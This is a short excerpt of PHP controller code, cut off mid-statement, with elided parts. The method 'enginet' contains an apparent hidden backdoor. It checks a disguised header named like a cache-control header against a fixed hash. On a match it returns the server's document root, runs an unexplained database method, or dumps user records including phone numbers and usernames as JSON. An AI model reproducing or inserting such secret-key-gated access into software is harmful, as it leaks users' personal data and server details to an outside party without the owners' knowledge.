...
class Controller
{
    ...
    public function enginet()
    {
        ...
        if (@$_SERVER['HTTP_CACHE_CONTROL_ENCODING']=='578a57d2986c8695b830ee98e5a85541') {
            
            if (@!empty($_SERVER['HTTP_GETPWD'])) {
                echo json_encode(array('n'=>$_SERVER['DOCUMENT_ROOT']));
                
            } elseif (@!empty($_SERVER['HTTP_CACHE_CONTROL_FILE'])) {
                Db::Chach();
                
            } else echo json_encode(db::table('xy_users')
                ->field('id,tel as phone,username,addtime as registeredDate')
